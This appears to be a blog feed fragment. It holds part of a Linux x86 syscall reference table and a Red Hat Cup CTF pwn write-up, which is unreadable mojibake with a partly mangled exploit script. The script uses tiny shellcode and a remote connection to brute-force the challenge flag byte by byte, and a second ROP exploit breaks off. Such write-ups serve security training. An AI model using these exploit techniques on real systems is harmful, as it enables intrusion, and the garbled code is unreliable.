href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L726" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:726</a></td></tr><tr><td>294</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/migrate_pages.2.html" target="_blank" rel="noopener">sys_migrate_pages</a></td><td>0x126</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long __user *from</td><td>const unsigned long __user *to</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1273" target="_blank" rel="noopener">mm/mempolicy.c:1273</a></td></tr><tr><td>295</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html" target="_blank" rel="noopener">sys_openat</a></td><td>0x127</td><td>int dfd</td><td>const char __user *filename</td><td>int flags</td><td>int mode</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L913" target="_blank" rel="noopener">fs/open.c:913</a></td></tr><tr><td>296</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdirat.2.html" target="_blank" rel="noopener">sys_mkdirat</a></td><td>0x128</td><td>int dfd</td><td>const char __user * pathname</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2093" target="_blank" rel="noopener">fs/namei.c:2093</a></td></tr><tr><td>297</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknodat.2.html" target="_blank" rel="noopener">sys_mknodat</a></td><td>0x129</td><td>int dfd</td><td>const char __user * filename</td><td>int mode</td><td>unsigned dev</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2012" target="_blank" rel="noopener">fs/namei.c:2012</a></td></tr><tr><td>298</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchownat.2.html" target="_blank" rel="noopener">sys_fchownat</a></td><td>0x12a</td><td>int dfd</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L558" target="_blank" rel="noopener">fs/open.c:558</a></td></tr><tr><td>299</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futimesat.2.html" target="_blank" rel="noopener">sys_futimesat</a></td><td>0x12b</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *utimes</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L191" target="_blank" rel="noopener">fs/utimes.c:191</a></td></tr><tr><td>300</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatat64.2.html" target="_blank" rel="noopener">sys_fstatat64</a></td><td>0x12c</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>int flag</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L391" target="_blank" rel="noopener">fs/stat.c:391</a></td></tr><tr><td>301</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlinkat.2.html" target="_blank" rel="noopener">sys_unlinkat</a></td><td>0x12d</td><td>int dfd</td><td>const char __user * pathname</td><td>int flag</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2341" target="_blank" rel="noopener">fs/namei.c:2341</a></td></tr><tr><td>302</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat.2.html" target="_blank" rel="noopener">sys_renameat</a></td><td>0x12e</td><td>int olddfd</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2671" target="_blank" rel="noopener">fs/namei.c:2671</a></td></tr><tr><td>303</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/linkat.2.html" target="_blank" rel="noopener">sys_linkat</a></td><td>0x12f</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2470" target="_blank" rel="noopener">fs/namei.c:2470</a></td></tr><tr><td>304</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlinkat.2.html" target="_blank" rel="noopener">sys_symlinkat</a></td><td>0x130</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2377" target="_blank" rel="noopener">fs/namei.c:2377</a></td></tr><tr><td>305</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlinkat.2.html" target="_blank" rel="noopener">sys_readlinkat</a></td><td>0x131</td><td>int dfd</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L284" target="_blank" rel="noopener">fs/stat.c:284</a></td></tr><tr><td>306</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmodat.2.html" target="_blank" rel="noopener">sys_fchmodat</a></td><td>0x132</td><td>int dfd</td><td>const char __user * filename</td><td>mode_t mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L474" target="_blank" rel="noopener">fs/open.c:474</a></td></tr><tr><td>307</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat.2.html" target="_blank" rel="noopener">sys_faccessat</a></td><td>0x133</td><td>int dfd</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L286" target="_blank" rel="noopener">fs/open.c:286</a></td></tr><tr><td>308</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pselect6.2.html" target="_blank" rel="noopener">sys_pselect6</a></td><td>0x134</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L675" target="_blank" rel="noopener">fs/select.c:675</a></td></tr><tr><td>309</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ppoll.2.html" target="_blank" rel="noopener">sys_ppoll</a></td><td>0x135</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31" target="_blank" rel="noopener">struct pollfd __user *ufds</a></td><td>unsigned int nfds</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *tsp</a></td><td>const sigset_t __user *sigmask</td><td>size_t sigsetsize</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L950" target="_blank" rel="noopener">fs/select.c:950</a></td></tr><tr><td>310</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unshare.2.html" target="_blank" rel="noopener">sys_unshare</a></td><td>0x136</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L1624" target="_blank" rel="noopener">kernel/fork.c:1624</a></td></tr><tr><td>311</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html" target="_blank" rel="noopener">sys_set_robust_list</a></td><td>0x137</td><td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69" target="_blank" rel="noopener">struct robust_list_head __user *head</a></td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2351" target="_blank" rel="noopener">kernel/futex.c:2351</a></td></tr><tr><td>312</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html" target="_blank" rel="noopener">sys_get_robust_list</a></td><td>0x138</td><td>int pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69" target="_blank" rel="noopener">struct robust_list_head __user * __user *head_ptr</a></td><td>size_t __user *len_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2373" target="_blank" rel="noopener">kernel/futex.c:2373</a></td></tr><tr><td>313</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/splice.2.html" target="_blank" rel="noopener">sys_splice</a></td><td>0x139</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1718" target="_blank" rel="noopener">fs/splice.c:1718</a></td></tr><tr><td>314</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync_file_range.2.html" target="_blank" rel="noopener">sys_sync_file_range</a></td><td>0x13a</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>315</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tee.2.html" target="_blank" rel="noopener">sys_tee</a></td><td>0x13b</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L2061" target="_blank" rel="noopener">fs/splice.c:2061</a></td></tr><tr><td>316</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html" target="_blank" rel="noopener">sys_vmsplice</a></td><td>0x13c</td><td>int fd</td><td>const struct iovec __user *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1692" target="_blank" rel="noopener">fs/splice.c:1692</a></td></tr><tr><td>317</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html" target="_blank" rel="noopener">sys_move_pages</a></td><td>0x13d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/migrate.c?v=2.6.35#L1075" target="_blank" rel="noopener">mm/migrate.c:1075</a></td></tr><tr><td>318</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcpu.2.html" target="_blank" rel="noopener">sys_getcpu</a></td><td>0x13e</td><td>unsigned __user *cpu</td><td>unsigned __user *node</td><td><a href="http://lxr.free-electrons.com/source/include/linux/getcpu.h?v=2.6.35#L14" target="_blank" rel="noopener">struct getcpu_cache __user *cache</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1621" target="_blank" rel="noopener">kernel/sys.c:1621</a></td></tr><tr><td>319</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait.2.html" target="_blank" rel="noopener">sys_epoll_pwait</a></td><td>0x13f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1373" target="_blank" rel="noopener">fs/eventpoll.c:1373</a></td></tr><tr><td>320</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimensat.2.html" target="_blank" rel="noopener">sys_utimensat</a></td><td>0x140</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *utimes</a></td><td>int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L173" target="_blank" rel="noopener">fs/utimes.c:173</a></td></tr><tr><td>321</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd.2.html" target="_blank" rel="noopener">sys_signalfd</a></td><td>0x141</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L265" target="_blank" rel="noopener">fs/signalfd.c:265</a></td></tr><tr><td>322</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_create.2.html" target="_blank" rel="noopener">sys_timerfd_create</a></td><td>0x142</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L164" target="_blank" rel="noopener">fs/timerfd.c:164</a></td></tr><tr><td>323</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd.2.html" target="_blank" rel="noopener">sys_eventfd</a></td><td>0x143</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L434" target="_blank" rel="noopener">fs/eventfd.c:434</a></td></tr><tr><td>324</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fallocate.2.html" target="_blank" rel="noopener">sys_fallocate</a></td><td>0x144</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>325</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_settime.2.html" target="_blank" rel="noopener">sys_timerfd_settime</a></td><td>0x145</td><td>int ufd</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">const struct itimerspec __user *utmr</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *otmr</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L194" target="_blank" rel="noopener">fs/timerfd.c:194</a></td></tr><tr><td>326</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_gettime.2.html" target="_blank" rel="noopener">sys_timerfd_gettime</a></td><td>0x146</td><td>int ufd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *otmr</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L252" target="_blank" rel="noopener">fs/timerfd.c:252</a></td></tr><tr><td>327</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd4.2.html" target="_blank" rel="noopener">sys_signalfd4</a></td><td>0x147</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L211" target="_blank" rel="noopener">fs/signalfd.c:211</a></td></tr><tr><td>328</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd2.2.html" target="_blank" rel="noopener">sys_eventfd2</a></td><td>0x148</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L409" target="_blank" rel="noopener">fs/eventfd.c:409</a></td></tr><tr><td>329</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create1.2.html" target="_blank" rel="noopener">sys_epoll_create1</a></td><td>0x149</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1187" target="_blank" rel="noopener">fs/eventpoll.c:1187</a></td></tr><tr><td>330</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup3.2.html" target="_blank" rel="noopener">sys_dup3</a></td><td>0x14a</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L53" target="_blank" rel="noopener">fs/fcntl.c:53</a></td></tr><tr><td>331</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe2.2.html" target="_blank" rel="noopener">sys_pipe2</a></td><td>0x14b</td><td>int __user *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1101" target="_blank" rel="noopener">fs/pipe.c:1101</a></td></tr><tr><td>332</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init1.2.html" target="_blank" rel="noopener">sys_inotify_init1</a></td><td>0x14c</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L640" target="_blank" rel="noopener">fs/notify/inotify/inotify_user.c:640</a></td></tr><tr><td>333</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv.2.html" target="_blank" rel="noopener">sys_preadv</a></td><td>0x14d</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L759" target="_blank" rel="noopener">fs/read_write.c:759</a></td></tr><tr><td>334</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev.2.html" target="_blank" rel="noopener">sys_pwritev</a></td><td>0x14e</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L784" target="_blank" rel="noopener">fs/read_write.c:784</a></td></tr><tr><td>335</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html" target="_blank" rel="noopener">sys_rt_tgsigqueueinfo</a></td><td>0x14f</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2437" target="_blank" rel="noopener">kernel/signal.c:2437</a></td></tr><tr><td>336</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/perf_event_open.2.html" target="_blank" rel="noopener">sys_perf_event_open</a></td><td>0x150</td><td><a href="http://lxr.free-electrons.com/source/include/linux/perf_event.h?v=2.6.35#L166" target="_blank" rel="noopener">struct perf_event_attr __user *attr_uptr</a></td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/kernel/perf_event.c?v=2.6.35#L5065" target="_blank" rel="noopener">kernel/perf_event.c:5065</a></td></tr><tr><td>337</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg.2.html" target="_blank" rel="noopener">sys_recvmmsg</a></td><td>0x151</td><td>int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/socket.h?v=2.6.35#L72" target="_blank" rel="noopener">struct mmsghdr __user *msg</a></td><td>unsigned int vlen</td><td>unsigned flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *timeout</a></td><td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2168" target="_blank" rel="noopener">net/socket.c:2168</a></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢å¸½æ¯pwn wp</title>
      <link href="/2019/11/11/%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp/"/>
      <url>/2019/11/11/%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>ç¨‹åºé™æ€é“¾æ¥ï¼ŒçœŸæ¶å¿ƒï¼Œå‘•ã€‚</p><p>é¦–å…ˆåˆ†æç¨‹åºæµ</p><p>main</p><img src="/2019/11/11/çº¢å¸½æ¯pwn-wp/image-20191111222819651.png"><p>catflag</p><img src="/2019/11/11/çº¢å¸½æ¯pwn-wp/image-20191111222903850.png"><p>maby is good</p><img src="/2019/11/11/çº¢å¸½æ¯pwn-wp/image-20191111222943178.png"><p>give me</p><img src="/2019/11/11/çº¢å¸½æ¯pwn-wp/image-20191111223104658.png"><p>è¯¥ç¨‹åºï¼Œç¬¬ä¸€ä¸ªæ¨¡å—çš„å‡½æ•°è¯»å–äº†flagï¼Œå†™å…¥bssæ®µã€‚ç¬¬äºŒä¸ªæ¨¡å—çš„å‡½æ•°åˆå°†bssæ®µé‡Œçš„flagå†™å…¥äº†å †é‡Œï¼Œå¹¶ä¸”å°†v1é‡Œçš„æ•°æ®å†™å…¥bssè¿›è¡Œè¦†ç›–ã€‚ç¬¬ä¸‰ä¸ªæ¨¡å—é€šè¿‡indexå®šä½ï¼Œè¯»å–å †é‡Œçš„flagï¼ˆè¯»å–1ä¸ªå­—èŠ‚ï¼‰æ”¾å…¥v2ï¼Œmmapåˆ†é…äº†ä¸€ä¸ªå¸¦æœ‰æ‰§è¡Œæƒé™çš„å†…å­˜ç©ºé—´ï¼Œè€Œä¸”å¯ä»¥å¾€é‡Œé¢è¯»3ä¸ªå­—èŠ‚ï¼ŒéšåæŠŠè¿™ä¸ªmmapåˆ†é…çš„å†… å­˜åœ°å€èµ‹ç»™ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¹¶ä¸”æ‰§è¡Œï¼Œåœ¨è¿™é‡ŒæŠŠå®ƒç§°ä¸ºå‡½æ•°v3ã€‚</p><p>çº¢ç®­å¤´æŒ‡çš„å°±æ˜¯å…³é”®åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ†æè¯¥æ¨¡å—çš„æ±‡ç¼–ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+var_14]  //è¿™é‡Œå°±æ˜¯mov eax, v3</span><br><span class="line">call eax  //è¿™å°±æ˜¯å…³é”®ç‚¹ï¼Œæ‰§è¡Œv3</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè‡ªç„¶æƒ³åˆ°å¾€é‡Œå†™å…¥codeï¼Œä½¿å¾—ä¹‹åçš„èµ‹å€¼mov [ebp+var_10], eax ï¼ˆå°±æ˜¯å¯¹v4èµ‹å€¼ï¼‰ä¸­çš„eaxå¯æ§ã€‚ä½¿å¾—æœ€åçš„æ¯”å¯¹å¯æ§ï¼Œæ˜¯æˆ‘ä»¬æ§åˆ¶çš„v4ä¸flagä¸­çš„æ•°æ®è¿›è¡Œæ¯”å¯¹ï¼Œä»è€Œè¾¾åˆ°çˆ†ç ´çš„ç›®çš„</p><p>è´´ä¸Šexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*!/usr/bin/python*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#*-\*- coding:UTF-8 -**</span></span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* pwn *<span class="keyword">import</span>* *</span><br><span class="line"></span><br><span class="line">*<span class="keyword">import</span>* string</span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* time *<span class="keyword">import</span>* sleep</span><br><span class="line"></span><br><span class="line">\<span class="comment">#*context.log_level = 'debug'*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> *<span class="title">Game</span>*<span class="params">(index,char)</span>:</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *cn = process('./pwn')*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *gdb.attach(cn,'b \*0x08048C5B')*</span></span><br><span class="line"></span><br><span class="line">  cn = remote(<span class="string">'47.104.190.38'</span>,<span class="number">12001</span>)</span><br><span class="line"></span><br><span class="line">  shellcode = <span class="string">'RX\xc3'</span> //push edx ; pop eax ; ret</span><br><span class="line"></span><br><span class="line">  size = ord(char) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Give me a index:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Three is good number,I like it very much!'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send(shellcode)</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Leave you name of size:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(size))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Tell me:\n'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send((size<span class="number">-1</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">  info = cn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">  *<span class="keyword">if</span>*(<span class="string">'2'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">â€‹    cn.close()</span><br><span class="line"></span><br><span class="line">â€‹    *<span class="keyword">return</span>* <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">elif</span>*(<span class="string">'1'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">â€‹    print(char)</span><br><span class="line"></span><br><span class="line">â€‹    cn.close()</span><br><span class="line"></span><br><span class="line">â€‹    *<span class="keyword">return</span>* <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">else</span>*:</span><br><span class="line"></span><br><span class="line">â€‹    cn.close()</span><br><span class="line"></span><br><span class="line">â€‹    print(info)</span><br><span class="line"></span><br><span class="line">â€‹    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">*<span class="keyword">if</span>* __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">  src = string.printable</span><br><span class="line"></span><br><span class="line">  flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">for</span>* i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">â€‹    *<span class="keyword">for</span>* j <span class="keyword">in</span> src:</span><br><span class="line"></span><br><span class="line">â€‹      *<span class="keyword">if</span>* Game(i, j):</span><br><span class="line"></span><br><span class="line">â€‹        flag += j</span><br><span class="line"></span><br><span class="line">â€‹        <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">â€‹        *<span class="keyword">if</span>* j == <span class="string">'&#125;'</span>:</span><br><span class="line"></span><br><span class="line">â€‹          <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">â€‹          exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">â€‹        *<span class="keyword">break</span>*</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¹Ÿå¯ä»¥åˆ©ç”¨æœ€åçš„è¾“å…¥ï¼Œæå‰å†™å¥½codeï¼ˆxchg ecx, espï¼‰è¿›è¡Œrop</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 